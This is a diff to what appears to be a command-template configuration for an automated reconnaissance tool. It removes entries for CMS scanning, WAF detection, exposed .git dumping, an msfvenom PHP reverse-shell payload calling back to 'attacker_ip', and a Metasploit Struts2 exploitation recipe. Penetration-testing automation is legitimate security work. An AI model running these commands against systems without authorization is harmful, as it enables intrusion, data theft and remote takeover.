@@ -71,22 +71,5 @@
   "Automated S3 Bucket Enumeration": [
     "awsbucketdump -t {target}",
     "s3scanner scan -b {target} -o {output}/s3scanner.txt"
-  ],
-  "Automated CMS Enumeration": [
-    "cmseek -u http://{target}",
-    "wpscan --url http://{target} --enumerate u --output {output}/wpscan.txt"
-  ],
-  "Automated WAF Detection": [
-    "wafw00f http://{target}"
-  ],
-  "Automated Information Disclosure Detection": [
-    "gitdumper http://{target}/.git/ {output}/gitdump/",
-    "bash gittools/extractor.sh http://{target}/.git/ {output}/gittools/"
-  ],
-  "Automated Reverse Shell Generation": [
-    "msfvenom -p php/meterpreter/reverse_tcp LHOST=attacker_ip LPORT=4444 -f raw > {output}/shell.php"
-  ],
-  "Automated Mass Exploitation": [
-    "echo 'Use Metasploit to launch exploits such as Apache Struts 2 OGNL injection: use exploit/multi/http/struts2_ognl_injection set RHOSTS {target} set PAYLOAD php/meterpreter/reverse_tcp set LHOST attacker_ip run' > {output}/metasploit_instructions.txt"
   ]
 }
